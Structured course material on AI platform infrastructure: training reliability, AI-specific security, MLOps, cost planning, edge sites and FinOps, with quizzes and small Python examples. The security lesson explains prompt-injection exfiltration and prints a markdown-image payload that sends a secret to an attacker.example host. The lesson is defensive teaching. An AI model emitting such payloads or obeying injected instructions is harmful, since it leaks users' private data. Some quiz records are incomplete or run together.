case.title: The Llama 3 Herd of Models (arXiv 2407.21783), section on infrastructure reliability
case.summary: During a 54-day snapshot of Llama 3 pre-training, Meta saw 466 job interruptions: 47 planned and 419 unexpected. About 78% of the unexpected ones were attributed to confirmed or suspected hardware issues such as GPU failures. Even so, they achieved more than 90% effective training time with automated maintenance.
case.lesson: At this scale, failure is routine. Fast detection, automated restarts and checkpointing decide how much compute you actually get.

lesson.code:
# Goodput under failures: checkpoint interval vs lost work (Young/Daly approximation).
import math
mtbf_h = 3.0            # cluster-level mean time between interruptions
ckpt_cost_h = 0.05      # time to write a checkpoint
optimal = math.sqrt(2 * ckpt_cost_h * mtbf_h)
def goodput(interval_h, restart_h=0.25):
    waste = ckpt_cost_h / interval_h + (interval_h / 2 + restart_h) / mtbf_h
    return 1 - waste
print(f"optimal interval {optimal*60:.0f} min, goodput {goodput(optimal):.1%}")
print(f"hourly checkpoints, goodput {goodput(1.0):.1%}")

subjects.title: AI-Specific Security for Platforms
subjects.why: AI adds threats classic infra security does not cover: injected instructions, stolen weights, over-permissioned agents.
subjects.explainer:
Platform teams own the controls that make AI applications safe regardless of model behavior. That means defending against prompt injection architecturally, protecting model weights as crown-jewel assets, scoping agent and tool permissions tightly, and governing MCP servers as supply chain.

Common mistakes: giving agents a shared admin token; letting agents fetch arbitrary URLs (an exfiltration channel); storing weights on broadly readable buckets; installing community MCP servers without review.

Security for AI is mostly classic least privilege applied to new actors.

resources.title: OWASP Top 10 for LLM Applications
resources.why: OWASP GenAI Security Project's 2025 Top 10 for LLM and GenAI apps, including the new system prompt leakage, vector/embedding weaknesses and unbounded consumption.

resources.title: MCP security best practices
resources.why: MCP security best practices: confused-deputy, token passthrough, session hijacking and SSRF attack vectors, with mitigations for MCP implementers.

resources.title: RAND: Securing AI Model Weights
resources.why: RAND report on securing frontier model weights: attack vectors and security levels (SL1–SL5) mapped to attacker capabilities.

resources.title: MITRE ATLAS
resources.why: MITRE ATLAS: an ATT&CK-style knowledge base of adversary tactics and techniques against AI systems, with real-world case studies. Use it to name threats in a threat model.

resources.title: Simon Willison: the lethal trifecta
resources.why: Simon Willison's 'lethal trifecta': private data plus untrusted content plus external communication equals exfiltration risk. Remove one leg.

subjects.project: Threat-model an internal agent that reads tickets, queries a database and posts to Slack. Map it to the lethal trifecta, then implement controls: scoped per-user tokens, an egress allowlist, an approval gate on posts, and a pinned MCP manifest. Red-team it with an injected ticket.

topics.title: Prompt Injection Defense in Depth
topics.explainer: Treat every model input that is not from the authenticated user as hostile, including retrieved documents, web pages, emails and tool results. Since detection is imperfect, limit consequences: remove one leg of the lethal trifecta (untrusted input, private data, outbound channel) wherever possible; block arbitrary egress, including rendered markdown images; require approval for outbound and irreversible actions; separate a privileged planner from a quarantined reader that returns only typed values; and log tool calls for detection. Test with an injection corpus in CI.

subtopics.title: Lethal trifecta analysis
subtopics.text: The 'lethal trifecta' (a term popularized by Simon Willison) is private data plus untrusted content plus external communication; remove one leg to stop exfiltration.

subtopics.title: Egress and markdown-image exfiltration
subtopics.text: Outputs that include links or images can leak data when rendered; restrict domains and strip unknown URLs.

subtopics.title: Dual-LLM / quarantined reader
subtopics.text: A quarantined model reads untrusted content but has no tools; a privileged model acts but never sees raw untrusted text.

topics.title: Weight Protection & Exfiltration
topics.explainer: Model weights can represent tens of millions of dollars and, for frontier models, real misuse risk. Protect them like signing keys: encrypt at rest with tightly scoped keys, restrict who and what can read buckets, keep inference in network segments without broad egress, monitor for large unusual reads and transfers, and use confidential computing where the host is not fully trusted. Insider risk matters: limit direct access and require multi-party approval for exports. Also watch model extraction via the API, where heavy query patterns imitate the model.

subtopics.title: Encryption and key scoping
subtopics.text: Encrypt weights at rest and limit which identities can use the keys.

subtopics.title: Egress monitoring for large transfers
subtopics.text: Alert on unusually large downloads from model storage, which can signal theft.

subtopics.title: Confidential computing
subtopics.text: Confidential computing protects data and models in use with hardware-based isolation.

topics.title: Agent, Tool & MCP Permissions
topics.explainer: Agents act with whatever credentials you give them, so scope them to the end user and the task: per-user OAuth tokens, short lifetimes, read-only by default, separate tools for reads and writes. Classify tools by side effect and attach policy (approval, rate limits) per class. For MCP, review servers like dependencies, pin versions and tool manifests to detect silent changes, run servers in sandboxes with egress limits, and centralize auth and logging in a gateway. Never let a server receive tokens meant for another service.

subtopics.title: Per-user scoped tokens
subtopics.text: Agents should act with tokens scoped to the current user, not a broad service account.

subtopics.title: Side-effect classes and approvals
subtopics.text: Classify tool actions by side effect (read, write, irreversible) and require approval for risky classes.

subtopics.title: MCP server review and pinning
subtopics.text: Review MCP servers before approval and pin exact versions so updates can't add new capabilities silently.

quiz.q: The 'lethal trifecta' combines…
choices: Untrusted input, private data access, and outbound communication
quiz.why: Together they allow data exfiltration via injection.

quiz.q: Why block agents from rendering arbitrary markdown images?
choices: Image URLs can carry stolen data to an attacker's server
quiz.why: A fetched URL with data in the query string is an exfil channel.

quiz.q: Pinning an MCP tool manifest defends against…
choices: A server silently changing a tool's description or behavior
quiz.why: Changes are detected before the model sees them.

quiz.q: Model weights should be treated like…
choices: Crown-jewel secrets such as signing keys
quiz.why: They are high-value assets for theft and misuse.

lesson.intuition: AI platforms face threats classic infrastructure security didn't plan for: text that hijacks an agent, model weights worth millions that can be copied, and agents holding broad permissions. Platform teams provide the defenses every app inherits: egress controls, scoped tokens, approved tool and MCP registries, weight protection and injection tests.
how: Analyze the lethal trifecta: an agent with access to private data, exposure to untrusted content, and a way to send data out is exploitable.
Break at least one leg: block or allowlist egress (including markdown image URLs), separate untrusted readers from privileged actors (dual-LLM pattern).
Protect weights: encryption, tightly scoped bucket and registry access, monitoring for large transfers.
Scope agent permissions per user, classify tool side effects, review and pin MCP servers, run them sandboxed.
Enforce through a gateway with policy and audit, and run injection regression tests in CI.
lesson.example: Markdown image exfiltration: an injected instruction makes an assistant output ![x](https://attacker.example/p?d=SECRET). If the chat UI renders images, the browser fetches the URL and leaks the secret. Fix: the UI only renders images from an allowlist of domains, and the gateway strips unknown URLs from outputs.
mistakes: Relying on prompts to stop injection while agents hold data and egress.
Letting any team install any MCP server.
Weights in buckets readable by broad roles.
lesson.enterprise: A SaaS company's platform blocks agent egress except to an allowlist, issues per-user OAuth tokens to tools, keeps an approved MCP registry with pinned versions, and runs 300 injection test cases on every agent release.
takeaways: Break the lethal trifecta.
Permissions per user, per tool, per side effect.
Treat weights as crown jewels.
lesson.diagram:
flowchart LR
  PD[Private data] --> AG[Agent]
  UC[Untrusted content] --> AG
  AG --> EX[Exfiltration channel]
  GW[Gateway policy] -.blocks.-> EX
  REG[Approved MCP registry] -.-> AG
  TOK[Per-user scoped tokens] -.-> AG
lesson.diagramAlt: Diagram: the lethal trifecta of private data, untrusted content and an exfiltration channel meeting in an agent, with gateway policy blocking egress and an approved MCP registry and scoped tokens limiting the agent.

subjects.title: Training Infrastructure at Scale
subjects.explainer:
FSDP/ZeRO, Megatron TP/PP, checkpoints, mixed precision, elastic jobs, preemption, topology, fairshare.

Common mistake: checkpoints on untested NFS. Another: no resume for preemptible.

64-GPU runbook is a product.

resources.title: NCCL user guide

topics.title: Software

subtopics.title: FSDP / ZeRO
subtopics.text: FSDP (PyTorch) and ZeRO (DeepSpeed) shard model states across data-parallel GPUs, gathering them only when needed.

subtopics.title: Megatron TP/PP
subtopics.text: Megatron-LM introduced efficient tensor and pipeline parallelism for transformer layers.

subtopics.title: Mixed precision
subtopics.text: bf16 mixed precision computes in 16 bits while keeping fp32 master weights for stable updates.

topics.explainer: Large-scale training combines several kinds of parallelism. FSDP and ZeRO shard parameters, gradients and optimizer states across data-parallel ranks. Megatron-style tensor and pipeline parallelism split the model itself. Checkpoints must be sharded and written asynchronously to avoid stalling. Mixed precision (BF16, FP8) speeds training. Profile regularly to find communication bottlenecks. Try it: train a small model with FSDP on two GPUs, then profile one step and identify what fraction of time is communication.

topics.title: Ops

subtopics.title: Elastic jobs
subtopics.text: Elastic jobs can continue with fewer or more nodes, which helps with failures and preemption.

subtopics.title: Preemption
subtopics.text: Training jobs should checkpoint and resume cleanly when preempted.

subtopics.title: Failure drills
subtopics.text: Practice failures deliberately to check that restarts and checkpoints work.

topics.explainer: Big jobs fail often, so design for it. Elastic training continues when nodes drop. Preemption needs fast checkpoint and restart. Map ranks to topology so heavy communication stays on fast links. Fairshare policies balance teams. Run failure drills: kill a node mid-run and confirm the job recovers within your target time. Try it: kill one node during a multi-node run and measure time to resume from the last checkpoint. That number is your real goodput tax.

quiz.q: Preemptible training requires…
quiz.why: Interrupts expected.

quiz.q: FSDP/ZeRO save memory by…
choices: Sharding parameters, gradients and optimizer states
quiz.why: Each rank holds only a shard.

quiz.q: The best measure of training resilience is…
choices: Time to resume after a node failure
quiz.why: Recovery time sets how much goodput failures cost.

lesson.intuition: Even teams that mostly serve models get asked to fine-tune or train. Training at scale splits a model and its data across many GPUs, keeps them busy, saves progress often and survives failures. The main tools are data parallelism with sharding (FSDP, ZeRO), tensor and pipeline parallelism (Megatron), checkpointing and mixed precision.
how: Data parallel: each GPU processes different data; gradients are averaged with all-reduce.
Sharding (FSDP, ZeRO) splits parameters, gradients and optimizer state across GPUs to save memory.
Tensor and pipeline parallelism (Megatron-style) split the model itself for very large models.
Use bf16 mixed precision, and checkpoint regularly to fast storage.
Run elastic or preemptible jobs, profile for bottlenecks and rehearse failure recovery.
lesson.example: Memory for full fine-tuning with Adam in mixed precision: about 16 bytes per parameter (2 bf16 weights + 2 bf16 gradients + 12 for fp32 master weights and two Adam moments). A 7B model needs ≈ 112 GB before activations, which doesn't fit on one 80 GB GPU. Sharding with FSDP across 8 GPUs gives ≈ 14 GB per GPU plus activations.
mistakes: Forgetting optimizer state when estimating memory.
Checkpointing too rarely on large jobs.
Not profiling, so data loading or communication bottlenecks go unnoticed.
lesson.enterprise: An enterprise fine-tunes a 13B model with FSDP on 16 GPUs, checkpoints every 30 minutes to a parallel file system, and uses Kueue to resume automatically on preemption.
takeaways: ~16 bytes/parameter for Adam mixed-precision training.
Shard state with FSDP/ZeRO; split models with TP/PP.
Checkpoint and rehearse failure.
lesson.diagram:
flowchart LR
  DATA[Data shards] --> G1[GPU 1: shard of params, grads, optimizer]
  DATA --> G2[GPU 2: shard]
  DATA --> GN[GPU N: shard]
  G1 <-->|all-gather / reduce-scatter| G2
  G2 <--> GN
  G1 --> CK[(Checkpoints)]
lesson.diagramAlt: Diagram: data shards feed GPUs that each hold a shard of parameters, gradients and optimizer state, exchanging data with all-gather and reduce-scatter, and saving checkpoints.

case.title: Maintaining large-scale AI capacity at Meta (Engineering at Meta, Jun 2024)
case.summary: Meta describes keeping GPU training clusters healthy while constantly upgrading them. That means more than 30 maintenance operations touching over 50 components, with many rollouts overlapping at any time, done without stalling training jobs.
case.lesson: Training infrastructure needs maintenance designed in from the start: rolling, overlapping and coordinated with job scheduling.

lesson.code:
# Training time estimate: FLOPs ~= 6 * params * tokens, divided by achieved cluster throughput.
def days(params_b, tokens_t, gpus, peak_tflops=989, mfu=0.40):
    flops = 6 * params_b * 1e9 * tokens_t * 1e12
    return flops / (gpus * peak_tflops * 1e12 * mfu) / 86_400
print(f"8B on 15T tokens, 1024 GPUs: {days(8, 15, 1024):.0f} days")
print(f"70B on 15T tokens, 8192 GPUs: {days(70, 15, 8192):.0f} days")

subjects.title: MLOps / LLMOps Platforms
subjects.explainer:
Run tracking, dataset versioning, prompt lineage, model CI/CD, canary/shadow, prompt flags, rollback. Eval gates.

Common mistake: weights in MLflow, prompts in Notion. Another: promote without eval artifacts.

Lineage across prompt/data/model/eval.

resources.title: Full Stack Deep Learning

topics.title: Experimentation

subtopics.title: Run tracking
subtopics.text: Tools like MLflow or Weights & Biases record parameters, metrics and artifacts for each run.

subtopics.title: Prompt lineage
subtopics.text: Record which prompt version produced which outputs and evals, just like model versions.

topics.explainer: Track every run with code version, data version, hyperparameters and metrics (MLflow, Weights & Biases and similar). Version datasets so results are reproducible. For LLM apps, track prompt lineage as carefully as code. Pin environments with containers or lock files. Store artifacts in a registry with metadata so anyone can find the model behind a deployment. Try it: pick a production model and see whether you can find its training data version, code commit and eval report in under five minutes.

topics.title: Delivery

subtopics.title: Prompt flags
subtopics.text: Feature flags let you switch prompt versions per user group and roll back instantly.

subtopics.title: Audit trails
subtopics.text: An audit trail records who deployed what, when, and based on which evidence.

topics.explainer: Deliver models like software: CI runs evals, CD promotes artifacts through stages with canaries or shadow traffic. Feature flags let you switch prompts or models without redeploying. Keep rollback one click away. Record who approved what and when, because regulators and incident reviews both ask. A good release pipeline treats a prompt change, a model change and an index rebuild the same way: tested, staged, observable and reversible. Try it: add an eval gate to one prompt's CI.

quiz.q: LLMOps extends MLOps with…
quiz.why: Prompts and evals join the loop.

quiz.q: Prompt lineage means tracking…
choices: Which prompt version produced which outputs and evals
quiz.why: Prompts are code-like artifacts.

quiz.q: Feature flags for prompts or models enable…
quiz.why: Fast rollout and rollback.

lesson.intuition: MLOps platforms make experiments reproducible and delivery safe. For LLM systems that means tracking not only training runs and datasets but also prompts, configs and evaluation results, then promoting versions through CI/CD with canaries and rollbacks, and keeping an audit trail of what was deployed when.
how: Track runs: parameters, code version, data version, metrics and artifacts.
Version datasets and prompts with lineage to the runs and deployments that used them.
Use reproducible environments (pinned containers, lockfiles).
Deliver through CI/CD with eval gates, canary or shadow releases and feature flags for prompts.
Keep audit trails linking each deployment to its evidence.
lesson.example: Reproducing a result: a model card claims 87.4% on an eval. With run tracking, anyone can look up the run ID, see the git commit, dataset hash, container digest and hyperparameters, re-run it and get 87.4% ± seed noise. Without it, the number can't be verified.
mistakes: Untracked notebook experiments that can't be reproduced.
Prompts edited in production with no version history.
Deployments without a link to the eval results that justified them.
lesson.enterprise: A bank's model risk team requires every production model or prompt change to link to a tracked run, dataset version and eval report, and keeps those links for audit.
takeaways: Track everything that changes behavior.
Version prompts like code.
Link deployments to evidence.

flowchart LR
  EXP[Experiment] --> TRK[(Run tracking: params, data, metrics)]
  TRK --> ART[(Artifact store)]
  ART --> CI[CI eval gate]
  CI --> CAN[Canary / shadow]
  CAN --> PROD[Production]
  PROD --> AUD[(Audit trail)]
lesson.diagramAlt: Diagram: experiments are tracked with parameters, data and metrics into an artifact store, pass a CI eval gate and canary to production, with an audit trail.

subjects.title: AI Unit Economics & Capacity Planning
subjects.why: 'Watch costs' is not a skill; computing $/1M tokens and GPUs-per-SLO is.
subjects.explainer:
AI infrastructure decisions come down to a few numbers: dollars per million tokens at a given latency SLO, GPUs needed for peak load with headroom, and the power and cooling those GPUs require. This subject teaches the arithmetic and the measurements behind it, so you can compare self-hosting with APIs, size clusters, and explain spend to finance.

Common mistakes: using peak benchmark throughput instead of throughput at your SLO; ignoring utilization; forgetting redundancy, engineering time and power limits.

resources.title: vLLM benchmarking docs
resources.why: vLLM benchmarking docs (site blocked our fetcher): benchmark_serving and throughput/latency scripts for measuring TTFT, TPOT and throughput.

resources.title: NVIDIA NIM LLM benchmarking guide
resources.why: NVIDIA NIM LLM benchmarking guide: metric definitions (TTFT, ITL, TPS), load patterns and how to benchmark latency and throughput properly.

resources.title: FinOps Foundation: FinOps for AI
resources.why: FinOps Foundation's FinOps for AI: tokenomics, AI cost allocation, unit economics and optimization levers for AI spend.

resources.title: Uptime Institute research
resources.why: Uptime Institute research: data center surveys and reports on power, PUE, outages and resiliency trends.

subjects.project: Benchmark one model at three latency SLOs, compute $/1M tokens for each at 40%, 70% and 90% utilization, compare with two API prices, and write a one-page sizing memo for 200 req/s peak including GPUs, nodes and kW.

topics.title: Cost per Million Tokens
topics.explainer: For self-hosted serving: $/1M tokens = GPU $/hour ÷ (tokens/hour ÷ 1,000,000). Measure tokens/hour at your latency SLO with realistic input and output lengths; throughput at batch 256 with 10-second latency is irrelevant if you promise 50 ms per token. Separate input and output tokens, as APIs do, since prefill is far cheaper per token than decode. Then divide by utilization to get the real cost of useful tokens. Add overheads: idle redundancy, engineering, storage, networking and eval traffic.

subtopics.title: Throughput at SLO
subtopics.text: Throughput at SLO is the token rate a GPU sustains while still meeting latency targets, usually well below peak.

subtopics.title: Utilization adjustment
subtopics.text: Divide by average utilization, because idle GPU hours still cost money.

topics.title: Capacity Planning
topics.explainer: Work backwards from demand. Required output tokens/s = peak requests/s × average output tokens. GPUs = required ÷ measured per-GPU tokens/s at SLO, plus headroom for spikes, failures and deploys (commonly 20-40%), rounded up to whole nodes and to your parallelism layout. Check KV memory too: concurrency × context length × KV bytes per token must fit. Revisit monthly, because model swaps, quantization and prompt length changes move every number.

subtopics.title: Demand modeling
subtopics.text: Forecast requests and token lengths by hour and month, including expected growth and peaks.

subtopics.title: KV memory check
subtopics.text: Confirm the KV cache for peak concurrency fits in GPU memory at the planned replica count.

topics.title: Power & Cooling Budgets
topics.explainer: GPUs turn into kilowatts. An 8-GPU H100 server can draw around 10 kW; newer rack-scale systems exceed 100 kW per rack and need liquid cooling. Facility constraints, utility capacity, rack power and cooling type, often decide where and how fast you can grow. Track energy per million tokens alongside cost, and include power headroom in capacity plans: you cannot add servers to a rack that is already at its power limit.

subtopics.title: Server and rack power draw
subtopics.text: AI servers draw several kilowatts each, so racks can need far more power than traditional ones.

subtopics.title: Air vs liquid cooling limits
subtopics.text: Air cooling limits rack density; liquid cooling supports denser GPU racks.

subtopics.title: Energy per million tokens
subtopics.text: Divide energy used by tokens served to compare efficiency across hardware and configurations.

quiz.q: A GPU at $3/h producing 6M useful tokens per hour costs per 1M tokens…
Why measure throughput at your latency SLO?
choices: Max-batch throughput may violate the SLO you promise
quiz.why: Only SLO-compliant throughput is sellable.

quiz.q: Peak 100 req/s × 400 output tokens, 2,000 tokens/s per GPU, 25% headroom needs…
A rack at its power limit means…
choices: No more servers until power or cooling is upgraded
quiz.why: Power, not floor space, is often the binding constraint.

lesson.intuition: 'Watch costs' isn't a plan. AI unit economics means computing what a million tokens actually costs you on your hardware at your latency targets, comparing that with API prices, and planning how many GPUs you need for next month's demand, including memory, headroom and power.
how: Measure throughput at SLO: tokens per second per GPU while meeting latency targets.
Compute cost per million tokens from GPU-hour price ÷ tokens per hour, adjusted for real utilization and overheads.
Compare with API prices for the same model class and quality.
Model demand (requests, tokens) and divide by per-GPU throughput at SLO, then add headroom.
Check KV memory and power budgets, and re-plan monthly.
lesson.example: Cost per 1M output tokens: a GPU at $2.50 per hour serves 2,400 output tokens per second at SLO. Tokens per hour = 8.64M, so $2.50 / 8.64 ≈ $0.29 per 1M at 100% utilization. At a realistic 50% average utilization it's ≈ $0.58, and with 30% overhead for redundancy and ops ≈ $0.75 per 1M.
mistakes: Using peak benchmark throughput instead of throughput at your SLO.
Assuming 100% utilization.
Forgetting redundancy, ops staff and power in the comparison with APIs.
lesson.enterprise: A company comparing self-hosting with an API found self-hosting cost $0.75 per 1M tokens versus $0.60 for the API at current volume; at the projected 4× volume next year, utilization rises and self-hosting falls to $0.45, so they plan the move for then.
takeaways: Cost per token = GPU price ÷ tokens at SLO × utilization and overhead factors.
Plan capacity from demand and per-GPU goodput.
Re-plan monthly as traffic and prices change.
lesson.diagram:
flowchart LR
  PRICE[GPU $/hour] --> CPT[Cost per 1M tokens]
  TPS[Tokens/s at SLO] --> CPT
  UTIL[Utilization] --> CPT
  OVH[Overheads] --> CPT
  CPT --> CMP{vs API price}
  DEM[Demand forecast] --> CAP[GPUs needed + headroom]
  TPS --> CAP
lesson.diagramAlt: Diagram: GPU price, tokens per second at SLO, utilization and overheads give cost per million tokens, compared with API prices; demand forecast and throughput give the GPUs needed.

Common mistake: air-gap means no updates. Another: attestation theater.

Update channel on day one.

topics.title: Design

subtopics.title: Offline registries
subtopics.text: Run your own container and model registry on site so deployments don't need the internet.

subtopics.title: Root of trust
subtopics.text: A hardware root of trust (TPM, secure boot) anchors the chain that proves software integrity.

topics.explainer: Edge and sovereign sites range from a single appliance to a full cluster. Air-gapped sites need offline registries for images and models, local DNS and PKI, and a hardware root of trust. Measured boot and signed software let you prove what is running. Design for operation with no internet at all. Try it: list every external dependency a cluster contacts at boot (NTP, DNS, registries, license servers) and plan an offline replacement for each.

topics.title: Ops

subtopics.title: Remote attestation
subtopics.text: Remote attestation lets a site prove, with signed measurements, which software it is running.

subtopics.title: Non-exfil telemetry
subtopics.text: Send only aggregate health metrics, never prompts or data, out of the site.

topics.explainer: Remote attestation verifies that a site runs approved software. Break-glass procedures handle emergencies with logged access. Telemetry must reveal health without leaking data. Plan for field-replaceable units and spares, since a failed GPU in a remote site cannot wait for a cloud ticket. Support staff may need clearances. Try it: design a telemetry schema that reports GPU health and throughput but contains no prompts, outputs or user identifiers.

quiz.q: Air-gapped clusters still need…
quiz.why: Updates must still flow.

quiz.q: Remote attestation lets you…
choices: Verify a site runs approved software
quiz.why: Measured boot and signed reports prove state.

quiz.q: Non-exfil telemetry means…
choices: Health metrics leave, prompts and user data do not
quiz.why: Design schemas with no sensitive fields.

lesson.intuition: Some AI has to run where public clouds can't reach: factories, ships, hospitals, government sites or fully air-gapped networks. Edge and sovereign infrastructure packages the whole stack, from registries to DNS to certificates, so it can run, update and prove its integrity without calling home.
how: Choose the form factor: a single appliance or a small cluster.
Provide local services: container and model registries, DNS, PKI and time.
Establish a root of trust: secure boot, measured software, remote attestation.
Plan offline updates, break-glass access and telemetry that doesn't leak data.
Design field support: spare parts (FRUs), remote diagnostics within policy, and clear procedures.
lesson.example: Offline update cycle: a monthly bundle contains 3 container images (12 GB), one model update (40 GB) and signatures. It is built and signed centrally, scanned, copied to approved media, verified by hash and signature on site, and installed to a staging slot. After smoke tests pass, the site switches over; the previous slot is kept for rollback.
mistakes: Assuming the site can reach the internet for updates or license checks.
No local PKI, so certificates expire and services break.
No way to prove what software is running.
lesson.enterprise: An energy company deploys inspection-model appliances at offshore platforms with local registries and PKI. Updates arrive monthly as signed bundles, and each appliance reports a signed attestation of its software state when connectivity allows.
takeaways: Bring the whole stack: registry, DNS, PKI.
Signed bundles and attestation replace cloud trust.
Plan support for places you can't easily visit.

flowchart LR
  HQ[Build + sign bundle] --> MEDIA[Approved media]
  MEDIA --> SITE[Site: verify hash + signature]
  SITE --> STG[Staging slot]
  STG -->|smoke tests pass| LIVE[Live slot]
  LIVE -->|attestation| HQ

subjects.title: Platform FinOps & Allocation
subjects.explainer:
Showback by team/model, idle killers, binpack vs spread, carbon-aware shifting, reserved/spot stewardship.

Common mistake: shared clusters with no idle reclaim. Another: unbelievable coarse chargeback.

FinOps next to SLOs.

subjects.project: Idle-GPU killer + showback by team and endpoint.

topics.title: Allocation

subtopics.title: Showback
subtopics.text: Showback reports each team's costs without billing them; chargeback actually bills internal budgets.

subtopics.title: Idle killers
subtopics.text: Automatically stop idle notebooks and scale down unused deployments after a set period.

subtopics.title: Binpack vs spread
subtopics.text: Bin-packing fills nodes fully to free others; spreading improves resilience. Choose per workload.

topics.explainer: Allocate GPU cost to teams with showback or chargeback using labels and quotas. Idle killers reclaim notebooks and dev pods left running. Binpacking packs work onto fewer nodes so others can scale down. Carbon-aware placement can be part of allocation policy. Quotas have economic meaning: they are budgets in GPU-hours. Try it: tag every GPU workload with team and purpose for a month and produce a showback report; surprises usually appear in the first week.

topics.title: Governance

subtopics.title: Anomaly detection
subtopics.text: Alert when spend jumps above normal patterns, for example a 3× daily increase.

subtopics.title: Rightsizing
subtopics.text: Match GPU type and count to real needs, for example a MIG slice instead of a full GPU.

topics.explainer: Set budgets per team and alert before they are hit. Detect anomalies such as sudden throughput drops (wasted GPUs) or token spikes. Report to executives in unit terms: cost per million tokens, cost per training run, utilization. Design incentives so teams benefit from efficiency. Rightsize regularly, since models and traffic change. Try it: define one unit metric (for example dollars per thousand resolved tickets) and report it monthly alongside raw spend.

quiz.q: Idle GPU reclamation should be…
quiz.why: Policy-driven savings.

quiz.q: Showback means…
choices: Showing teams their usage and cost without billing
quiz.why: It builds awareness before chargeback.

quiz.q: Binpacking helps cost by…
choices: Packing work onto fewer nodes so others can scale down
quiz.why: Empty nodes can be released.

lesson.intuition: Without visibility, GPU spend becomes a shared mystery bill. Platform FinOps shows each team what they use (showback) or charges them for it (chargeback), finds idle and oversized resources, and gives incentives to use capacity well. Clear numbers turn arguments about who uses too much into decisions.
how: Tag every workload with team, project and environment.
Allocate costs: GPUs, storage, network and shared services, including idle capacity.
Find waste: idle GPUs, oversized requests, forgotten notebooks; automate idle shutdown.
Set budgets and anomaly alerts per team.
Report to executives monthly with cost per outcome, and rightsize.
lesson.example: Idle killer: 120 notebook GPUs at $2 per hour each are idle 70% of the time. An auto-stop after 60 minutes of inactivity recovers most of that: if it cuts billed hours by 55%, monthly savings ≈ 120 × 730 × $2 × 0.55 ≈ $96,000.
mistakes: No tagging, so costs can't be attributed.
Charging only for allocated GPUs, hiding that shared capacity sits idle.
Budgets without alerts, discovered only on the invoice.
lesson.enterprise: A tech company introduced showback dashboards per team and an idle-notebook auto-stop. Within two quarters GPU spend per active project fell 30%, and teams started requesting MIG slices instead of whole GPUs for small jobs.
takeaways: Tag, allocate, show.
Kill idle resources automatically.
Budgets + anomaly alerts + monthly reviews.

lesson.code:
from collections import defaultdict
# Showback: allocate shared GPU cluster cost by measured GPU-hours, with idle cost spread proportionally.
cluster_cost = 100_000.0
usage = {"search": 3_000, "support-bot": 1_500, "research": 4_500}   # GPU-hours this month
capacity = 12_000
idle = capacity - sum(usage.values())
bill = defaultdict(float)
for team, h in usage.items():
    bill[team] = cluster_cost * h / capacity + cluster_cost * idle / capacity * h / sum(usage.values())
for t, v in bill.items(): print(f"{t:<12} ${v:,.0f}")
print("idle share:", f"{idle/capacity:.0%}")
